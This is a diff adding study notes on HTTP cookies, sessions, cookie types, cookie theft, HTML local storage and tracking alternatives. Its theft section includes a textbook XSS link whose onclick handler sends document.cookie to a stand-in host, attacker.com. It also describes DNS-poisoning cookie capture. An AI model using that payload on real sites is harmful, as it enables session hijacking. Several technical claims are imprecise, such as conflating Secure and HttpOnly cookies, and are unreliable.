@@ -1,0 +1,134 @@
+#Cookies
+A cookie, also known as an HTTP cookie, web cookie, or browser cookie, is used for an origin website to send state information to a user's browser and for the browser to return the state information to the origin site.[1] The state information can be used for authentication, identification of a user session, user's preferences, shopping cart contents, or anything else that can be accomplished through storing text data on the user's computer.
+Cookies cannot be programmed, cannot carry viruses, and cannot install malware on the host computer
+
+#Session Vs Cookies
+Sessions are server-side files that contain user information, while Cookies are client-side files that contain user information. Sessions have a unique identifier that maps them to specific users. This identifier can be passed in the URL or saved into a session cookie on client side.
+
+Most modern sites use the second approach, saving the identifier in a session cookie instead of passing it in a URL (which poses a security risk). You are probably using this approach without knowing it, and by deleting the cookies you effectively erase their matching sessions as you remove the unique session identifier contained in the cookies.
+
+Cookies are stored in browser as a text file format.It is stored limit amount of data.It is only allowing 4kb[4096bytes].It is not holding the multiple variable in cookies.
+Sessions are stored in server side.It is stored unlimit amount of data.It is holding the multiple variable in sessions. we cannot accessing the cookies values in easily.So it is more secure.
+
+#Type of cookies
+There are two types:
+1. Session cookies - these are temporary and are erased when you close your browser at the end of your surfing session. The next time you visit that particular site it will not recognise you and will treat you as a completely new visitor as there is nothing in your browser to let the site know that you have visited before (more on session cookies).
+
+2. Persistent cookie
+Persistent cookies - these remain on your hard drive until you erase them or they expire. How long a cookie remains on your browser depends on how long the visited website has programmed the cookie to last. For this reason persistent cookies are also called tracking cookies.
+
+Others base types are:
+1. First party cookies - cookies from site which user visited
+2. Third party cookies - cookies from site which not visited by user, generally come from advertizement
+
+Other types:
+1. Secure cookie or HttpOnly cookie
+These are cookies that are used only when transmitting a HTTP (or HTTPS) request, so that other non-HTTP technologies such as javascript and APIs of other websites cannot use the cookie to manipulate your computer. They are stored on a user’s hard drive.
+Here ‘HttpOnly’ flag included in the http cookie header which allow only Http protocol to use cookies.
+Adv:
+Stop stealing through XSS vulnerabilities
+
+2. Supercookie
+(permanantly stored and difficult to remove)
+A super cookie is a type of browser cookie that is designed to be permanently stored on a user’s computer. Super cookies are generally more difficult for users to detect and remove from their devices because they cannot be deleted in the same fashion as regular cookies. 
+Super cookies serve the same function as regular persistent cookies.
+
+3. Zombie cookie
+A zombie cookie is any cookie that is automatically recreated after a user has deleted it. This is accomplished by a script storing the content of the cookie in some other locations, such as the local storage available to Flash content, HTML5 storages and other client side mechanisms, and then recreating the cookie from backup stores when the cookie's absence is detected.
+
+********************************************************************************************
+# Cookie Theft Types:
+1. Network eavesdropping
+A cookie can be stolen by another computer that is allowed reading from the network
+Traffic on a network can be intercepted and read by computers on the network other than the sender and receiver (particularly over unencrypted open Wi-Fi). This traffic includes cookies sent on ordinary unencrypted HTTP sessions. Where network traffic is not encrypted, attackers can therefore read the communications of other users on the network, including HTTP cookies as well as the entire contents of the conversations.
+An attacker could use intercepted cookies to impersonate a user and perform a malicious task, such as transferring money out of the victim’s bank account.
+This issue can be resolved by securing the communication between the user's computer and the server by employing Transport Layer Security (HTTPS protocol) to encrypt the connection. A server can specify the Secure flag while setting a cookie, which will cause the browser to send the cookie only over an encrypted channel, such as an SSL connection.[
+
+2. Publishing false sub-domain – DNS cache poisoning
+Via DNS cache poisoning, an attacker might be able to cause a DNS server to cache a fabricated DNS entry, say f12345.www.example.com with the attacker’s server IP address. The attacker can then post an image URL from his own server (for example, http://f12345.www.example.com/img_4_cookie.jpg). Victims reading the attacker’s message would download this image from f12345.www.example.com. Since f12345.www.example.com is a sub-domain of www.example.com, victims’ browsers would submit all example.com-related cookies to the attacker’s server; the compromised cookies would also include HttpOnly cookies
+
+3. Cross-site scripting – cookie theft
+Scripting languages such as JavaScript and JScript are usually allowed to access cookie values and have some means to send arbitrary values to arbitrary servers on the Internet. These facts are used in combination with sites allowing users to post HTML content that other users can see.
+As an example, an attacker may post a message on www.example.com with the following link:
+<a href="#"
+ onclick="window.location='http://attacker.com/stole.cgi?text='+escape(document.cookie);
+ return false;">
+Click here!</a>
+
+4. Cross-site scripting: a cookie that should be only exchanged between a server and a client is sent to another party.
+When another user clicks on this link, the browser executes the piece of code within the onclick attribute, thus replacing the string document.cookie with the list of cookies of the user that are active for the page. As a result, this list of cookies is sent to the attacker.com server. If the attacker’s posting is on https://www.example.com/somewhere, secure cookies will also be sent to attacker.com in plain text.
+
+********************************************************************************************
+
+#HTML Local Storage
+With local storage, web applications can store data locally within the user's browser. Before HTML5, application data had to be stored in cookies, included in every server request. Local storage is more secure, and large amounts of data can be stored locally, without affecting website performance.
+Unlike cookies, the storage limit is far larger (at least 5MB) and information is never transferred to the server.
+Local storage is per origin (per domain and protocol). All pages, from one origin, can store and access the same data.
+origin e.g.
+www.abc.com  http    - origin 1
+www.abc.com  ftp     - origin 2
+
+
+HTML local storage provides two objects for storing data on the client:
+1. Local Storage - The localStorage object stores the data with no expiration date. The data will not be deleted when the browser is closed, and will be available the next day, week, or year.
+2. Session Storage - stores data for one session (data is lost when the browser tab is closed)
+same origin url open in different tabs will not share data, so same web page open in two different tabs cannot share the same session storage.
+
+
+#feature:
+1. Both local storage and session storage are scoped to document origin, so
+https://mydomain.com/ 
+http://mydomain.com/ 
+https://mydomain.com:8080/
+All of the above URL's will not share the same storage.
+
+2. Both : data saved by IE cannot be read by Chrome or FF i.e. cross browser can't access each other data
+3. In most browser both storage has same capacity 5MB and no difference between normal mode and incognito mode
+
+********************************************************************************************
+
+#Cookies Vs HTML 5.0 Local Storage
+
+Cookies:
+Adv:
+1. Have expiration date
+2. Legacy support (it's supported by all browsers and all their versions)
+
+Disadv 
+1. With each server calls cookies will send the data stored to server, this will affect the site’s performance.
+If there are 10 cookies with 4KB then all will sent along with each request.
+2. web storage space for cookies is too low, less than 4kb. 
+3. Some user turned off cookie feature
+4. SQL injection can be performed from a cookie
+5. Inaccurate identification
+If more than one browser is used on a computer, each usually has a separate storage area for cookies. Hence cookies do not identify a person, but a combination of a user account, a computer, and a web browser. Thus, anyone who uses multiple accounts, computers, or browsers has multiple sets of cookies.
+6. Inconsistent support by devices -The problem with using mobile cookies is that most devices do not implement cookies; for example, Nokia only supports cookies on 60% of its devices, while Motorola only supports cookies on 45% of its phones
+
+Local Storage:
+Adv:
+1. Size is not limited to < 4 kb , web storage can use 5 mb of space.
+2. Not sending the data to server with each request calls, this will improve the site performance.
+3. Improved security.
+4. Supported by all modern browser
+
+Disadv:
+1. old browsers versions still not support LS 
+IE7, FF 3.4, Safari 3, Chrome 3 etc dont support
+2. If server need some client info then we explicitly have to send with request
+
+Alternatives to cookies
+1. Local Web Storage used in HTML 5.0
+2. IP address
+Some users may be tracked based on the IP address of the computer requesting the page. The server knows the IP address of the computer running the browser or the proxy, if any is used, and could theoretically link a user's session to this IP address.
+3. URL (query string)
+A more precise technique is based on embedding information into URLs. The query string part of the URL is the one that is typically used for this purpose, but other parts can be used as well. The Java Servlet and PHP session mechanisms both use this method if cookies are not enabled.
+4. Hidden form fields
+Another form of session tracking is to use web forms with hidden fields. This technique is very similar to using URL query strings to hold the information and has many of the same advantages and drawbacks; and if the form is handled with the HTTP GET method, the fields actually become part of the URL the browser will send upon form submission. But most forms are handled with HTTP POST, which causes the form information, including the hidden fields, to be appended as extra input that is neither part of the URL, nor of a cookie.
+5.window.name
+All current web browsers can store a fairly large amount of data (2–32 MB) via JavaScript using the DOM property window.name. This data can be used instead of session cookies and is also cross-domain. The technique can be coupled with JSON/JavaScript objects to store complex sets of session variables[54] on the client side.
+The downside is that every separate window or tab will initially have an empty window.name when opened. Furthermore, window.name can be used for tracking visitors across different websites, making it of concern for Internet privacy.
+In some respects this can be more secure than cookies due to not involving the server, so it is not vulnerable to network cookie sniffing attacks. However, if special measures are not taken to protect the data, it is vulnerable to other attacks because the data is available across different websites opened in the same window or tab.
+6. Cache
+The browser cache can also be used to store information that can be used to track individual users. This technique takes advantage of the fact that the web browser will use resources stored within the cache instead of downloading them from the website when it determines that the cache already has the most up-to-date version of the resource. For example, a website could serve a JavaScript file that contains code which sets a unique identifier for the user (for example, var userId = 3243242;). After the user's initial visit, every time the user accesses the page, this file will be loaded from the cache instead of downloaded from the server. Thus, its content will never change.
+7. Browser fingerprint
+A browser fingerprint is information collected about a browser's configuration, such as version number, screen resolution, and operating system, for the purpose of identification. Fingerprints can be used to fully or partially identify individual users or devices even when cookies are turned off.
